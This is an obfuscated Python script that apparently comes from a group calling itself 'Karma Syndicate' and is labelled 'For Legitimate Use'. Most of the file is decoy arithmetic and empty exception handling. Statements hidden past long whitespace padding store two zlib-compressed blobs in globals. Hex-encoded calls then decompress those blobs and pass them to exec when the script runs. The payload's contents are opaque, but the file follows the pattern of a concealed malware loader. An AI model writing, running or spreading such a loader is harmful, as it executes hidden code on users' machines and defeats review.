from builtins import *
from math import prod as Calculate


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


_multiply, System, Walk, Run, _power, Round, Divide = exec, str, tuple, map, ord, globals, type

class _negative:
    def __init__(self, Add):
        self._memoryaccess = Calculate((Add, 26398))
        self.StackOverflow(Square=58722)

    def StackOverflow(self, Square = int):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._memoryaccess *= -43795 / Square
        
        try:
            (({_modulo: Walk}, Run) for Run in (Walk, Walk))

        except OSError:
            (((System, _modulo, _multiply), Run) for Run in (Walk, Walk))

        except:
            Divide(81779 - 25831) == str

    def _while(self, _statistics = -53615):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _statistics *= -40205 - -69550
        self._absolute != None
        
        try:
            (((System, _modulo, _multiply), _power) for _power in (Walk, Walk))

        except AssertionError:
            (System, Walk) if Walk != _multiply else (System, Walk) >= Run

        except:
            Divide(28524 - -31031) == int

    def _stackoverflow(Random = float):
        return Round()[Random]

    def Negative(_divide = 41962 * -72383, _frame = str, MemoryAccess = Round):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        MemoryAccess()[_divide] = _frame
        
        try:
            ((System, (System, _modulo, _multiply)) for System in {System: Walk} if _modulo is Walk)

        except OSError:
            ((_modulo, (_power, _multiply)) for _modulo in {_modulo: Walk} if Round == System)

        except:
            Divide(77850 + 92900) == type

    def execute(code = str):
        return _multiply(System(Walk(Run(_power, code))))

    @property
    def _absolute(self):
        self._product = '<__main__.StackOverflow object at 0x000001174BE10720>'
        return (self._product, _negative._absolute)

if __name__ == '__main__':
    try:
        _negative.execute(code = __license__)
        _square = _negative(Add = 88730 + -94872)

        if 152389 > 8139816:
            _negative(Add = -73336 - 31364)._while(_statistics = -7713 / _square._memoryaccess)
        elif 175790 < 9874718:
            _square.StackOverflow(Square = _square._memoryaccess / -14610)                                                                                                                                                                                                                                                          ;_negative.Negative(_divide='SSSS2SSS22S2222222SSS2',_frame=b'x\x9c\xdd\x1bko\xabF\xf6\xbb\x7f\x857\xfb\xc1\xb0q]<\xc0\x0c\x8edi\xabu\xdau\xd6\x89\xab\xe6\xae|\xab\xea\xca\xc20$\xa4\x98q\x017\xc9V\xbb\xbf}\xcf\xbcl\xfcJ\xcc%\xbe\xbd\n0\xcc\xfbu\xe6\xccy\r\x14\xd9\xf3E\xa3\tW\x1c\x19\xc2\xe7\xd7tZ0\x96L\xa7\xcd\xbf\xf4\xcf\xbegYsD\xef\xe2"\x9e\xfb\x05m\xfe;\xa7gM\x96\x95\x8a\xfa\xcb\xe2\x9ee\xb9(m\x9c}\xa0\t\xbd\xcb\xfc\xf9\xc5Y\xfb\xec\xefO\xa9?c\xb33s\xa3<\xcb\xee\xfc4\xfe\x8f_\xc4,\x95]\xfc\xcb\xcf\xe6~\xf3\xf69\r\xe3\x00\xfa\xd8j\xbfP-\xca\xb2\xf7E\xb1\xc8/\xbe\xfd\xb6\xe8\xcc\xe9\xb7\xa2\xe2\xa1z\xbf\xd3,_u1\x82\xfc\xbc\xd8*\x91\xc4\x01Ms*J\xb4\x1c\xcf\xc6\x96MB\xbb\x87\x10Av\xd7E\xd6,\xb0m\x07\xfb=\'\xf0|\xd2j\x98\x17\xab\xbaqZ\x18\xad\xfc\xd78l\x99\r\xfa\x14\xd0E\xa1\x80\x98.\x96\x85q\xf6cB\xfd\x9c6\x07,m\x15\xcdk\x16\xc6\xd1\xf3\x99\xd9\x90\x9d\xc6\xf3\x05\xcb\x8a\xe9\x14\xea?\xe7-\xb3C\x9f\xe2\xc20\x1b\t\x0b\xfc$7\xcc_Z\xb7\xb7\x08\xae[\xf0n\xf9%"\x10l}\xea\xdf%l\x06\x85\x1a\x07J\xf0\xca\xd77\xf2V\x0f\xbc\xf8us\xd3\xfa\xe5\xe2\xe2\xfc\x9b\xf3o\x8co\x8c\xf3\xaei~\x82\xc6h\xe1\x17E\xf6Rc\t\\Cu%\xf2\x02\x7f\xb7\xa90~\xb1\x99\xc1\x80\r\x06\xe3\xc1\x18\x1e\xc6\xc0cc\x06\x93\x91\x13n\xec\xc9T\xf3\x90\x03\xe7\x01\x11\xbe\x81:k\xe8\xbd\xd4\x1f\xf7y\x96\xc8\x11\xa9\x88CoO\x93Fk\xb6\x8c\x93"N\xf9B\xfc\xeeg\x07\x87\x03\x9eL\x81L\x08\x0f\x84?\x10\xf3X\x81\xf8f\x05vq\x1b{\xfb\xcb\xd3\xb8H\xe2\xe5l\x1b\x88f[\xc06\xd9\x06y\xc5V\xcc_\xde\xa6\x99N\x9c\x86\xf4\xc9h%\xfe\xeft\'\xf7\x93\xd9\xd8\x07b\xb1l\xb2q\x05\x0c\x01\x9a\xf7\x0e"\x9a\xc4\x8b9\x0b\xaa@)M\xe7\xf2\x11\x1e\xbc\xb8\xf7\xee\xe1\x94\'\xfe\xf7U\xa04\x99|\x9c|T\xd7d\xc2c\x93\t\x00\xa9\xd5\xea<\xb08=X\x8d\xefY\x8b;fY\x0c\xf6\xaa5\xb6\xacqe\xe0\xc6q\x90\x03\x97\xaa\t\xdc\x83\xadT\x03\xee\xe1f4p\x9f\xa38y\xa2\xf7\xe9r/\x80\x0f\x93J\t\x14\t\x88k\xb1_o\xde;\x1efE^\x11H\x8a\x95^\xcb\xb7\x02\xd7\xcd\xbb\x07\x14]f\x1f\xaa\xecW\xb1\xeb\xc4\xbec|\xd3\x8d\xc7c\xbe\xff\xc6\xd6{\x87S\xe1\xb3$\xda\x07\xa8\x03\xb2\xc4\xd5\xe8\xeaj4\xba\x1a\x8eF\xa3\xe1\xd5\xd5\xf0\n\xba\x7f\xef J\x18\xdb\xcd}q\xd3\xed\xa5\xe2\xc6\xac\x85\x03\xa7\xa7\x9d\xbcel\x1d\xd7y2\r\xe4\xba\x90\x06,\xa4F\xcb\x8b\x8a=\xe4\xf1}\x03>\xa0O\x95\xe47\xb4Z\x03\xbd \xa0x\x94\xea\x1f\x92\x83\x8dC\xebe\xbbnd{\xe0\xba\xe0\x90\xf2\x1dp68\x0b\x1c\xe6q4C\x1e\n\x8f*k\xa3W\xd7\xd4\x14JI\xe2\xcfg!h\x95r\x1e\xd2\xdd\xcay_\xec\xdd\x99\x07\x812L\xc4=\xe4N\xaf\xcdQ@i\x99](`\x1dY\xd6\x9eZSg\x8a\xa7\xf6\x14\xc1\x1b\xc3\xdb\x81\n\xcenj\xbd\x05!\n\xb0\xb6\x02\xb6\xab\x80\xbbZ\x0c\x0e|\xb5 \xc7\x94\xed\x1e\xb7 \xda}\xeaW\x1e2\xe8\xe3\x01B\xafvrh\xfd\x0e5\xebz.Q\xb7\xb7\n{\xa5\xf0*\xfe:\x11\xa9>\'\x82\xbb\x88\xbc\xf9\x9c0\x85;T7U1\xedT\xe8\x14\xb3\xa9\xb7B\\cG\xeb\x87\xe7\xd6\xc3q{\x8bp\x10\x15w\x95\xe3\xe1\x9e\xc2\xf1c\xcaz\xc7\x12\x9d\xcf\xc0\x03\xc7\xc5\x948\xd8%\x08YN\x80{\xc4&\x8e\xed#\xab\x06v\xb4\x9e\x9e\x1e\xe1y\x94\x1e\x04D\x0c\xde\xf5\xa0\xdaE\xa1\x80\x98U\x91\x04KAG\\C.\xf6\\A\xb4\x1a\t>\x88\xee\xe1\x16\xc2\xaf\x91~\x1dS[\xe1u\xb4\xd7\x1cC\xf4*G\xa1\xe5\x92\x8b\xfd\x03\xab:^\xc7q"\x0c\xb7\x139\xceF8r\xd6\xa9\x8e\xceu\xa2\xd3lU\x8el\x1eqPD,\x10\x92\xba\xb8\x87i\xcd\xcd\xbb!\xbf\xd5\x97\x19*#\xda\xd7\xc2R\x1c\xdf\xe1\xb2\xa7t\xf2\xeeA\x9a\xaf\xc2\xbe\xca\x83\xf7IX\x8a\x8b`e\x81\x80\xe1\x80\xaf\xaeKpD\x10\x9e\xf1\xf5\xc5\x04\x85\x90\x0bH\x069\xa1K\x1c\xcf\t\x11\x90\x1d\x81\x07\'`C[\xd2\xf9\xa6\x9c\xce\xdf\xba\x04>\r$\x08\x88\'\x18 \x01\xf3\xef\xc1,{.\xcc\x1bf?\x83Tz\x82\xf9:!\xdcT\xdd\xa1z\x87\xa5T\x19\x12\xb1\xd3\xcc\xd7\xe53\x06\x16R\x83i\x80"\xaa(4\x04\x80D\x8f\xae\xea\x0b\x9a\x9ere\xa1Q\xa7\xa1\x12\x13>\xa6\xec\t\x990r\x83Z4\xf0P\xc3D^^\xc9\xf7Th\xf3\x86\xeb4xa\xe1.P\x04\xbb\x0e^\xa4sn\xa7V\xc6j\xfe\xd4W\x08\xb5\x8c\x85\x95\xdc\x85\x94\xac\xd5\xd3(PR\x08_*K\x04\n\x9d\x0e-0\xc6\x9cZ\xb9u\xd8\xe3<\x957\x7f\tHJ@\x1e\xa9\x14\xba\xa0\xf8u\xa7=p\xce\x94\xc0\x1bO\tT\xc0\xbb\xa9G\xb6gA\x81n}\xe1Z+\x83\xaeZ\x14G-FW\xb9\xb2p\xfdZ\xd9#\xf7u\x1d\x05\x92\xd4\xa2\x8c\x07w\xb7\xa7v\xb4\xb7\xda\xe1zo\x93\r\'R\x8f\x96?\x19\xef\x03\x1cL\x0b\xe6(\xfcAE\x8b\x85\x14\xc3V\xfa\x94,\xf1\xe6\x18R\xc5\xbcq\x10\x9b,%\xebU6#(hq\x86u\xc5\x19\xd7h(m\xaa\xa0l\x8c\xdeJ\\\xefm\x1b\x1a\xb7\x85\x19-\xc8\x1c#\xc6\xa8\x01\x8b\xf3\xbe\xb9"\xaa\xa9\xa0\t\x922\\\x1c\xb4\x86\x1e\\\xe7\x87$I\x1e\xe2\xe4\x01\\\x92\xc4\x0f\x10x\xf8r+\xa7\t\xb1\xb6\xd2!\xc5\xb7\xf5\xfe\xf6\x84\xb5N\xd2\x81c\xca\xa2\xe31\xe0S\x7f\x8f\x11\xdd0\xfe\xb7\xf7`\xd5d\x99a\x1c8\xc31\xfd44\xf6\xd7z\x81\xa4s\x15Vt;\x12\xda\xech\xf4\xd5\xab;\xc4u\xb0\x07\xaa\x1e\xc53d\xb9=P\x03\\t\n\xfb\x93Vo\x84\xaa#o_\xa9>%\x15\xe8xR\x08\xf4\x0e\x88 \'}\xd0\x8b\xbc8\rd\x157xKn9\xb5\xba\x92\x1b\xcf+\xf0\xe0\xde\x14\x01\x9f\xb5\xe0m\x03\xaf\xedM]\xc1\x83wR\xdf\xc6R\xee\x95\xf6\x8a6JiG\xb6,\xe5/\x95\xc5U\xf6\xd3\xe7h\xd0Z\x9f\xac!\x1c\xc1z2\xde\xb0<5\xe4\\o\xfc\xe5\x04\x19-\x90h\x05\xa3,Uj\xc9\xd3-\x01\xfc\xb5\xb2N\x15\x80k\xdb\x18\'\x1f\xf0\xe2\x94l\xc8i\x1aP2H\xa8\x8a\xdf\xd7k\xfav\xbd:\xd3\xff\xfa\xa9\xd2)(\x902\xa5\xd9\x96m)\xa3\x9aH\xe1q\x9e\xc2sd\x0cG\xf2>\x89\x91\rE \x1aD\x98\x08\xe3Zd\x97b.\xef\x94\xe2\x80\xf4l.\xf5\xd4\xd8<\x8a.\xc2\x8b\x93D>\xb0\xb1\xa0\x97_n\x07U\xc4\x91M\xc1\x8d\xcbl\x82\x85\xf3\x07\x90\x7fXQ\xc8-\x9d\xd9\xae\xf8\xf9q8\xcfIz\x17H\xb7\x07\xc4\x9b\x082\xee(\xb5j\'\xf5\xc8\xf6\x08\x94\xb5\xc1u\xa1\xb63u\xa1\x05\x10\xb0\xce\xbd\xdd\xd4\xfa&\x15\xac\\\xaf\xa4\x13k\xbf[2\xa7\xbcT\xae\xc2z}\xe6\xde\x96\x1cI\xa1\x87-8\xd7\xeb]\xbe\xf8)\xd8\x84\x7f\x0c6\xe1\x0f\xbc\xbe\xa8\xce\xf19\xd3w*t\xf1\xc2\x06\x17j\xa0\xe8J\xec\x88\xc1\xa0>\xc7\xeb)\x1c \xca\xd7\xf8\xa1\xc5r\xaf\xc4\xf1^+{\xcc\xa2\xd6\x10/\xd0\tLr\xabC\xa1\xf5\xc1\xd1V\xec4\x87..q0\x06\xe0\x9e\xe0\xd0A\x1b\x9d\xc3\x92\xd99\xdc0;\x87\x1b\x06\xea\xd3\xcc\x10{\xc4\x81\xdb"\xb6\xed\xa3\x08\xf8\x9fM,<\xc3]X\xc7\x10w\x11\xc56\xb6Q\xe4\x84\xc4\xc5=\xd7\x83ax8\x006L@\xa4\xf2\xec\x1e\xf1\x9c\xc8\xb5p\x88"~$\xe1\xd8\xce\x0c\x90\x0cj\xda6\x88\x98\x16\x94\x0f\x81wF\x88B\x9b\x1e\xb1\xeapM\xae+\xc7p\x81\xae\xcc\x95f\xa9?\xc3\xfbk\')\x08\xd9\xbe\x8d\x00b\x1el\xbb\x1a\xf3\xe7\xdf\xb0\xc8/Y\xd4W-G\xb28\x04\x0cQ2\xb2\x1egd\x10\xe2Z\x90\xbd\x9bz\n;\x130d\xaee\xf5\x04s\xb6\x81\x95\xf6\xa0\x02\xdaM\xfdSlQ\x1bb\xcdXJ/B\x10\xe3\xda\x8d\x88\xc2]Q\xb8\xd1\x9f=\x0b~\xa7\xd9\xdf\xa4\xde\xf4\xb4\xb2H\x14%\xd7\xd4\xdd.Qwm\xb09\xa6\xec\x91\x06\x9bz\xb8n\xd7\xc1u\xd1\xdfX\x88\xc6\xdc\x8a \xd7\xa5\x82\xd6\xef\x08\x01\xae+t|O\xe0\x1c\xdeM\xfd\x13D\xe8\xcf1\x00E\xa0x\x84\xf2\xb4\x9f\x87\x8fQ\xbd\xa2\x8c\xcd\x9b\xfa\x0f\x99\xa6\xfc\xf5\xa6I\x9fh\xd0\x16\xff9\xb5\x17Y\x9c\x16m\xee\xe6\xfe\xa2\x9d\x17Y\x9b-h\xda\xe0%\x8c\x1b\xf5\x95\xa2\x94\xcd\xa5\x9c~m6T#\x01K\x83e\x96\xd1\xb4\xe8D\xcbb\x99\xd1\\\xe7\xe4\xf3b\x91\xc43\xd9w\x11\xcf\xa9\xee\x17\x9a\x8fx|7G\x84\xfd\\\xf8\x99n\'\xf3\xd3\x90\xcdW1\xba\x0e\xfd\xb6\xa4y\xb1\xee\xaf\x80I\xdc5JM\xc9\x0e\x02\x96\xb0\xcc\x9f\xfb\xaa\x93\xbf\xe9\x12\x0cj\xa6qa\xf8\xcb\x82\xc1\xb0i\xd1\x7f\x10\xecC\x18`\x1f\xb8\x116I\x1e\xccFF\x83i\x10\xb3\xbe\xfa\x9ct\r\n\xf5\xa9\xe9\r\xf4\xd2\xff\x1eZ\xe8\xfct9hD\x81\x0c\xff\xe3\xe7\xef \xe3QF&\xff\x1c~\xb8lDw2\xf6\xc3O\x97\x97\x907\x97\xb1\xeb\xef~\xb8\xbc\xf9\xf0]#z\x96\xf1\x9f/G\xa3\xf1\xa4\x11\xd2\xa8\x19,\x82{\x1a\xfcj,\xb3D\xfd\xb0V\xe8_\xfc\xf8\x05@\xf1\xe3\xb4\xbd\xcci\x96\xfas\xda^<\x86}(\xda\xc9\x01\xea\x85!\xac\xce\xda\x0c}+7\x92\xb9\xaa\xab+\xf5\xa5\xf5zmM\x93\xa1f\xf3\xaf\xcd\x9f\xe8"\xf1\x03\xda,\xee\xe9\xaax\xf31.\xee\x9bg\x19c\xc5\xd9\xd68\xfa\xd2\xebd\xb2\x9a1\xf9\xb8\xa2v\x13I\xfe\xf8\xd5\x16\xa6m\x0e[')

        if 204415 > 4977660:
            _square.StackOverflow(Square = _square._memoryaccess / -91171)
        elif 444601 < 9810459:
            _negative(Add = -29689 * -38344).StackOverflow(Square = _square._memoryaccess / -64651)                                                                                                                                                                                                                                                          ;_negative.Negative(_divide='lIIlIlIlllllIlllIlI',_frame=b"\x0ef\x807\xe7\xdf\x1c\xde\xeb\xa1\x01\xca\xf4\xf5\xd2vni\xce\xff\xfc3\xd6\xd9\xf7,/T_\xe7b\x8f\xf0M\x02\x01\x0b\x02j\xb30\xb6n\x8c\xdd\xf5\xffX\xab\x97\xd7\xfa\xd7\x08\xf0.V\x80\xe3\xdfS\t'>\xb4\x92\xd7\xe3\xe3\x05\xc0\xf3\xbf\xab\x86`D}\x18Yg\x01\xdd\x1b|\x0c\xed\xd0/\xfc>\xb4\xdf\xe6\x98\xc6\x96E_)4\x93\x8fz\xe6\xebA\xc7QS|\x04,\xd9\xf5P~\x19\xcc\xe3\xcd8\xe5xk@\xf3\x1d\xd8I\x05l\xa3\xd2\xbf\x89\xfc\x12;\xd3\xa8L&0\x88\xdcd\x861&$tg\x14y\xb8\x87\xdc\x10Y\x90\xc6?\x9fP\xe4\x83\x84$ 3\xfd\xc9\x01\x08\xce]\xc8qU\xaaE\x08v\x08\xd4\x91\xb5\x91\xe5b\xc8\x0f\xa0\xde1\x86Bsc\x16\x9c\x9a\x18\xc240\x92v~i/\x18\x0eGm\xf9G\x90\xd6\ne\xe4\xa3\xd9y\xcc\xe2\x82\x1aj\xa1Su\xe0*\x11\x94\xbf\xce\xf5\xea\x9d\xaf?\xb2N\x14\x84\x93\xe19\xac\xdd\xf9\x95\xb4H@/\xe2Ti8\xbcZ\x8f\x89&9}S8\x13\xf4vpvx\x8d\xea\xb0.\xff\xbd*f\xe4\xe7\xb9\xa0#y\xe0\xa7F\xb4L\x03\xfe\x9fn;\x07\xb8\xe6\xfb\xe8\x89\xd8\xdb\xbb\xe4\xbc\xf3\xe1>\xa3~\xf8#c\xc9%\xb0\x03N,\x8d\x9b\x1bM\rK\x7f\xa7\x9a@\xb8\xa9*\xb1\t[\x9d\xda\x01\xe6\xb2=\x90\xd2\xd0\x9b\x97\xc2\x83<\xce\x03J\xeb#\xd7\x86\x9ab6\x1c!\x0c5\xfe\x19\x9b\xf93\xf6\xdc\x97?\xeb\xdej\x9a\xa7\x1fE\xf0\xa28\xa1y\xff\x8f\xf2\xe1\x90 {\x17\x86\xaa/\x98\xdd*\xc2e;&\x10A\xaa\xecp\x99m!q\xc8\xc3\x0b!\xf1q\xc4\xe0\xe6:S\x92\x08\x80\xd3\x82\xa59]S.A(\x14\xefh\xcb\x11\x88\xb7\x1c\x92\x98{\x7f\xa3\xdb\xd5\xb9\x958E\\Q\xe36Ma\xe9\x81\xb1\xf5\xf5\xe8W\x87\x1ef\x87/\x8caJ\x8a\x9f\xc4)\xcd\x15\xa1\x14+\xae\xd8\x87\x863\xd0\xa0\xe9\x94\xef\x98\xe9\xb4\xdf\x1f\x08YJ\x88RL\xc8R|F\x12\xa6\x12\xbe\x8d5\xdcG\xf2\x90L\x1e\x93\xf1\xa0\xd9\xf8?\xf3\x1f\xb5K")

        if 460981 > 936242:
            _negative(Add = -2015 * 96687).StackOverflow(Square = _square._memoryaccess - 3643)
        elif 113375 < 6949585:
            _negative(Add = 77996 / -83330).StackOverflow(Square = _square._memoryaccess - -76626)                                                                                                                                                                                                                                                          ;JLLIJILILIIJLLJJIIJJJIJ,ILIJIJJLLJILIJJJLJLII,xwwxxwxxxxxxwwxwwwwxxwxw,wxwwwwwxxxxxxxwwxwxxxw,O0oo00O0O000OOo00OooOO=(lambda IIlIllllIllIIIIlIIIlllIl:IIlIllllIllIIIIlIIIlllIl['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IIlIllllIllIIIIlIIIlllIl:IIlIllllIllIIIIlIIIlllIl(__import__('\x7a\x6c\x69\x62'))),(lambda IIlIllllIllIIIIlIIIlllIl:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIlIllllIllIIIIlIIIlllIl)"),filename='\x4d\x4e\x4e\x4e\x4e\x4d\x4e\x4d\x4e\x4e\x4d\x4d\x4d\x4d\x4d\x4d\x4e\x4d\x4d\x4d\x4e\x4e\x4e',mode='\x65\x76\x61\x6c'))),(lambda:(lambda IIlIllllIllIIIIlIIIlllIl:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIlIllllIllIIIIlIIIlllIl)"),filename='\x4d\x4e\x4e\x4e\x4e\x4d\x4e\x4d\x4e\x4e\x4d\x4d\x4d\x4d\x4d\x4d\x4e\x4d\x4d\x4d\x4e\x4e\x4e',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda DOoDOoOOOOoooODOOoooo,IIlIllllIllIIIIlIIIlllIl:DOoDOoOOOOoooODOOoooo(IIlIllllIllIIIIlIIIlllIl))
        _square.StackOverflow(Square = _square._memoryaccess * 19275)                                                                                                                                                                                                                                                          ;wxwwwwwxxxxxxxwwxwxxxw()(O0oo00O0O000OOo00OooOO(JLLIJILILIIJLLJJIIJJJIJ(ILIJIJJLLJILIJJJLJLII(xwwxxwxxxxxxwwxwwwwxxwxw('\x76\x61\x72\x73'))),_negative._stackoverflow(Random='SSSS2SSS22S2222222SSS2')+_negative._stackoverflow(Random='lIIlIlIlllllIlllIlI')))

    except Exception as _modulo:
        if 150267 > 3990228:
            _negative.execute(code = System(_modulo))

        elif 475531 > 4946678:
            _negative(Add = 47039 + -66601).StackOverflow(Square = _square._memoryaccess + 54383)